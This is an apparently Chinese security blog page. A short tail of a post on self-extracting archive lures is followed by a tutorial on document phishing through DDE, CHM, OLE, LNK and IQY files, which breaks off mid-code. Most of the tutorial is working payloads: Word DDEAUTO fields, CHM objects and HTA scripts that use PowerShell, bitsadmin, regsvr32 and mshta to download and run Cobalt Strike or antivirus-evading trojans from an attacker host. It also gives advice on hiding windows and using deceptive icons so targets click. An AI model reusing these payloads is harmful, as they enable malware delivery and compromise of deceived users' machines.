<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731114155257.png" alt="image-20200731114155257"></p>
<p>制作好后的文件如下：</p>
<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731114238680.png" alt="image-20200731114238680"></p>
<p>如果有些目标没有注意或者没有开启显示扩展后缀，则有可能点击上线，最后，当目标点击我们的文件时，会打开正常的pdf内容，并且也可以正常上线。</p>
<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731114536851.png" alt="image-20200731114536851"></p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>使用自解压的方式即使shellcode是免杀的，360也会拦截，后来经过多次测试，得到结果如下。</p>
<p>当使用pdf.exe等后缀作为自解压的后缀，执行时会被360拦截，当使用其他ico而不是自解压自带的图标，360会直接查杀。</p>
<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731151230910.png" alt="image-20200731151230910"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于文档钓鱼的学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-07-29 17:00:12" itemprop="dateCreated datePublished" datetime="2020-07-29T17:00:12+08:00">2020-07-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-08-04 12:03:45" itemprop="dateModified" datetime="2020-08-04T12:03:45+08:00">2020-08-04</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">虽然word,office这些办公软件的漏洞都比较早了，不过由于很多人用的都不是正版的程序，因此很多人电脑的办公软</span><br><span class="line">件依然存在漏洞，所以也是值得去研究和学习的，本文记录了我学习的过程。</span><br></pre></td></tr></table></figure>

<p><strong>学习环境</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">office套件2016</span><br><span class="line">windows10 10.0.17763.1282</span><br></pre></td></tr></table></figure>

<h3 id="DDE钓鱼"><a href="#DDE钓鱼" class="headerlink" title="DDE钓鱼"></a>DDE钓鱼</h3><p>​    动态数据交换(DDE)是一种动态数据交换机制，使用DDE通讯需要两个Windows应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。我们可以利用这个属性在office中执行我们的恶意代码。</p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>​    创建一个docx的文档，使用ctrl+f9创建一个文本域，在括号中输入下面的命令后保存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;&#x2F;k notepad.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200729172057226.png" alt="image-20200729172057226"></p>
<p>​    保存后再打开我们输入的内容会被隐藏，而且会弹出两个选择框</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200729172513107.png" alt="image-20200729172513107"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200729172618241.png" alt="image-20200729172618241"></p>
<p>​    选择是后则会执行我们的命令</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200729172642611.png" alt="image-20200729172642611"></p>
<h4 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h4><p>​    既然已经可以通过DDE进行命令执行了，那么上线CS也不是什么难事，生成一个powershell</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200729175435312.png" alt="image-20200729175435312"></p>
<p>​    在docx中插入如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO &quot;C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.5.123:80&#x2F;a&#39;); # &quot; &quot;Microsoft Document Security Add-On&quot;</span><br></pre></td></tr></table></figure>

<p>​    打开文档，当点击是即可上线。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200729180949159.png" alt="image-20200729180949159"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200729181024735.png" alt="image-20200729181024735"></p>
<p>​    当然也可以上线exe,这个上线的过程会比powershell加载稍微慢一点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;&#x2F;k bitsadmin &#x2F;transfer cb82 http:&#x2F;&#x2F;192.168.5.123:83&#x2F;a %APPDATA%\cb82.exe&amp;%APPDATA%\cb82.exe&amp;del %APPDATA%\cb82.exe&quot;</span><br></pre></td></tr></table></figure>

<h3 id="CHM钓鱼"><a href="#CHM钓鱼" class="headerlink" title="CHM钓鱼"></a>CHM钓鱼</h3><p><strong>什么是CHM?</strong></p>
<p>​    CHM（Compiled Help Manual）即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。</p>
<p><strong>如何制作CHM?</strong></p>
<p>​    我这里使用的是Easy CHM这个软件，首先我们把要制作的文件放到一个目录下，如下所示：</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200730131309129.png" alt="image-20200730131309129"></p>
<p>​    然后打开Easy CHM选择新建，工作目录选择我们制作文件的目录。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200730131522644.png" alt="image-20200730131522644"></p>
<p>​    新建后内容如下，选择编译-》生成CHM即可生成CHM文件</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200730131608853.png" alt="image-20200730131608853"></p>
<h4 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h4><p>​    我们打开之前创建的index.html文件，将文件的内容替换为如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;&#x2F;title&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id&#x3D;x classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;</span><br><span class="line">&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&#39;,calc.exe&#39;&gt;</span><br><span class="line"> &lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;&#x2F;OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>​    然后我们同样打开easy chm选择“新建”打开创建的内容并且将文件编译为chm文件，最后打开这个chm文件，我们就可以执行命令</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200730223639788.png" alt="image-20200730223639788"></p>
<h4 id="CS上线-1"><a href="#CS上线-1" class="headerlink" title="CS上线"></a>CS上线</h4><p>​    首先使用CS选择attacks——&gt;web Drive by——&gt;scripted web Delivery，在弹出的对话框选择powershell。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200730225309177.png" alt="image-20200730225309177"></p>
<p>​    选择lauch后会生成一段代码，我们将代码复制下来，然后将index.html中执行calc.exe的部分进行替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.5.123:82&#x2F;a&#39;))&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    插入这段代码后，我们重新编译chm文件，执行后即可上线，不过使用这种方式有一个缺点，就是会有一个powershell的窗口一闪而过。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200730230027508.png" alt="image-20200730230027508"></p>
<p><strong>如何不弹框？</strong></p>
<p>​    这里我测试，使用regsvr32加载远程dll是不是弹框的，因为远程加载嘛，稍微会有点卡顿,需要修改的部分如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,regsvr32,&#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.5.123:803&#x2F;a scrobj.dll&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    当然也可以使用CS生成一个hta文件挂载在服务器上，然后加载上线，这种方式也不会有弹框</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,mshta,http:&#x2F;&#x2F;192.168.5.123:804&#x2F;test.hta&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>如何上线自定义木马？</strong></p>
<p>​    有时候我们又有这样的需求，目标环境可能装有各种杀软，所以我们肯定不能直接用CS生成的马，需要自己去做免杀处理再生成马，这样的马一般可能是exe，这个时候我们该如何让目标上线呢？这里首先肯定是不能用bitsadmin进行传输上线的，虽然也可以上线，不过会弹出一个黑窗，而且这个黑窗持续的时间还比较长，太显眼了。这里可以使用迂回的方法，在index.html中，去加载hta,然后再hta中加载我们的exe。</p>
<p>​    首先准备一个xxx.hta文件，文件内容如下，其中我们只要将请求的地址改一下就可以了，这里http请求的就是我们准备好的免杀的exe，需要提前传到服务器上。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line">    window.resizeTo 0,0</span><br><span class="line">    window.MoveTo -100,-100</span><br><span class="line">	const impersonation &#x3D; 3</span><br><span class="line">	Const HIDDEN_WINDOW &#x3D; 12</span><br><span class="line">	Set Locator &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">    Locator.Run&quot;powershell.exe &quot;&quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.5.123:804&#x2F;download&#x2F;file.ext&#39;,&#39;c:\\windows\\temp\\file.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\windows\\temp\\file.exe&#39;)&quot;&quot;&quot;,0,FALSE</span><br><span class="line">    window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>​    然后将这个hta文件也上传到服务器,最后在index.html中将命令执行的部分修改为如下内容，最后进行编译运行后即可上线，并且这个过程也没有弹窗提示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&quot;,mshta,http:&#x2F;&#x2F;192.168.5.123:808&#x2F;download&#x2F;file.ext&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    使用mstha执行会被360和火绒进行拦截</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801142720585.png" alt="image-20200801142720585"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801142745518.png" alt="image-20200801142745518"></p>
<p>​    同样，在调用powershell的情况下也会被360和火绒拦截。</p>
<h3 id="OLE钓鱼"><a href="#OLE钓鱼" class="headerlink" title="OLE钓鱼"></a>OLE钓鱼</h3><p><strong>什么是OLE？</strong></p>
<p>​    OLE是Object Linking and Embedding的缩写，即“对象链接与嵌入”，这是一种把一个文件的一部分嵌入到另一个文件之中的技术，使用这种方式可以不开启宏执行命令。</p>
<h4 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h4><p>​    首先我们准备一个test.bat放到服务器上，内容为calcl.exe。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801163537482.png" alt="image-20200801163537482"></p>
<p>​    我们创建一个test.docx文件，打开文件后选择 “插入”-》“对象”</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801163043981.png" alt="image-20200801163043981"></p>
<p>​    在弹出的框中写入bat的地址，显示为图标是需要勾选上的，图标是可以更改的，也可以更改为一个更有迷惑性的图标。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801163847679.png" alt="image-20200801163847679"></p>
<p>​    在word中插入了这个文件后，当目标点击了这个图标，会弹出一个框，点击运行后即可执行命令</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801164318100.png" alt="image-20200801164318100"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801164355540.png" alt="image-20200801164355540"></p>
<p><strong>高版本的windows+office是否可以执行？</strong></p>
<p>​    我使用高版本的windows+office进行测试，无法执行</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803152419493.png" alt="image-20200803152419493"></p>
<h4 id="CS上线-2"><a href="#CS上线-2" class="headerlink" title="CS上线"></a>CS上线</h4><p>​    实现了命令执行的功能，我们再尝试生成exe远程加载看能否直接上线。</p>
<p>​    首先我们先生成一个exe挂载到web上，然后再使用上面讲的方法将链接插入，当双击以后会让确认是否运行，如果点击确定即可上线。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801170149323.png" alt="image-20200801170149323"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801170233779.png" alt="image-20200801170233779"></p>
<p>​    上面的测试因为我使用的是CS生成的exe，关掉windows自带防护测试的，如果使用的免杀马同时开启了defender的防护是否会被拦截，经过测试defender是不会拦截的，但是一定要确保马是免杀的才行，否则这个test.docx文件会直接被defender删除。</p>
<h3 id="LNK钓鱼"><a href="#LNK钓鱼" class="headerlink" title="LNK钓鱼"></a>LNK钓鱼</h3><p><strong>什么是LNK？</strong></p>
<p>​    LNK是一种指向其他文件的文件，就是我们熟悉的快捷方式。</p>
<p><strong>如何创建LNK？</strong></p>
<p>​    创建LNK的方式比较简单，只需要对着桌面右键 新建-》快捷方式，即可创建LNK文件。</p>
<h4 id="命令执行-3"><a href="#命令执行-3" class="headerlink" title="命令执行"></a>命令执行</h4><p>​    选中LNK文件，选择属性，在弹出的窗口中对“目标”中的内容进行如下更改，即可执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\system32\cmd.exe cmd &#x2F;c calc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801205203060.png" alt="image-20200801205203060"></p>
<p>​    当点击这个文件即可实现命令执行。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801205230402.png" alt="image-20200801205230402"></p>
<p>​    这里当当我们执行cmd时，发现LNK的图标发生了改变，可能看上去不太好看，可以通过如下方式更改图标。</p>
<p>​    选中更改图标，再选择浏览，搜索shell32.dll,会有很多图标可以选择，选择合适的图标即可。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801210118694.png" alt="image-20200801210118694"></p>
<h4 id="CS上线-3"><a href="#CS上线-3" class="headerlink" title="CS上线"></a>CS上线</h4><p>​    首先使用CS生成一个powershell的payload.</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801205459013.png" alt="image-20200801205459013"></p>
<p>​    之前我们是手动创建的LNK文件，也可以使用Shortcut_gen自动创建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shortcut_gen.exe payload.txt payload.lnk</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801210630955.png" alt="image-20200801210630955"></p>
<p>​    当我们双击这个LNK文件，即可上线</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801211025516.png" alt="image-20200801211025516"></p>
<p>​    这里我踩了一个小坑，因为我是在桌面运行的Shortcut_gen.exe，而且我的桌面下还有cmd.exe，因此生成的文件默认会在桌面上找cmd，但是其他主机桌面不一定有cmd，导致执行报错。</p>
<p><strong>如何上线自定义马？</strong></p>
<p>​    因为CS直接生成的马不免杀，传上去可能直接就被360，defender等防护软件干掉了，所以我们要生成一个免杀的马加载上线,可以使用powershell远程加载exe的方式实现.</p>
<p>​    首先生成一个免杀的exe挂载到web服务上，然后将如下代码保存为txt文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:803&#x2F;test666.exe&#39;,&#39;c:\\windows\\temp\\test666.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\windows\\temp\\test666.exe&#39;)</span><br></pre></td></tr></table></figure>

<p>​    使用Shortcut_gen将txt文件转换成LNK，最后双击这个LNK文件即可上线，值得注意的是，双击后底部会有一个窗口，点开后会是一个黑窗口，这个窗口持续时间的长短取决于下载我们免杀exe需要的时间。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801214224643.png" alt="image-20200801214224643"></p>
<p>​    最后因为这个方式是调用了powershell，360是会拦的，当装有360时，无论我们调用cmd或powershell，都会被拦截。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801214540346.png" alt="image-20200801214540346"></p>
<h3 id="IQY钓鱼"><a href="#IQY钓鱼" class="headerlink" title="IQY钓鱼"></a>IQY钓鱼</h3><p><strong>什么是IQY?</strong></p>
<p>​    IQY可以理解为excel中特殊的web浏览器，可以将web上的列表数据引入到当前的excel中。</p>
<h4 id="命令执行-4"><a href="#命令执行-4" class="headerlink" title="命令执行"></a>命令执行</h4><p>​    首先我们在web服务上上传一个文件，文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;cmd|&#39;&#x2F;c calc.exe &#39;!A0</span><br></pre></td></tr></table></figure>

<p>​    再创建一个excel文件，选择 “数据”-》“自网站”，将url导入</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802100039588.png" alt="image-20200802100039588"></p>
<p>​    导入后会有如下两个弹框，点击确定后即可触发payload</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802100126912.png" alt="image-20200802100126912"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802100215456.png" alt="image-20200802100215456"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802100231728.png" alt="image-20200802100231728"></p>
<p>​    当我们把这个excel文件发送给目标，首先目标要点击启用内容，然后才会弹性出远程数据不可访问的框</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802120554300.png" alt="image-20200802120554300"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802120618374.png" alt="image-20200802120618374"></p>
<p>​    而且再高版本的windows或者office中，点击启用后还是无法执行的，会弹出DDE被禁用。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802120805677.png" alt="image-20200802120805677"></p>
<h4 id="CS上线-4"><a href="#CS上线-4" class="headerlink" title="CS上线"></a>CS上线</h4><p>​    首先使用CS生成远程加载payload的地址</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802101121391.png" alt="image-20200802101121391"></p>
<p>​     准备一个test.html,并将这个html挂载到web上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;cmd|&#39;&#x2F;c bitsadmin &#x2F;transfer 051c http:&#x2F;&#x2F;192.168.5.123:801&#x2F;test666 %APPDATA%\051c.exe&amp;%APPDATA%\051c.exe&amp;del %APPDATA%\051c.exe &#39;!A0</span><br></pre></td></tr></table></figure>

<p>​    再创建一个excel，将生成的链接插进去即可上线</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802120310720.png" alt="image-20200802120310720"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200802120323735.png" alt="image-20200802120323735"></p>
<p><strong>如何使用IQY实现自定义马上线？</strong></p>
<p>​    首先我们需要准备一个hta文件，这个hta的功能就是调用powershell远程下载exe并且执行，再在html中写入通过mshta调用hta的代码。</p>
<p>​    <strong>实现过程</strong></p>
<p>​        首先生成一个免杀的马并且挂载到web上，编辑如下hta文件,将powershell下载的部分替换为我们的免杀马的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line">    window.resizeTo 0,0</span><br><span class="line">    window.MoveTo -100,-100</span><br><span class="line">	const impersonation &#x3D; 3</span><br><span class="line">	Const HIDDEN_WINDOW &#x3D; 12</span><br><span class="line">	Set Locator &#x3D; 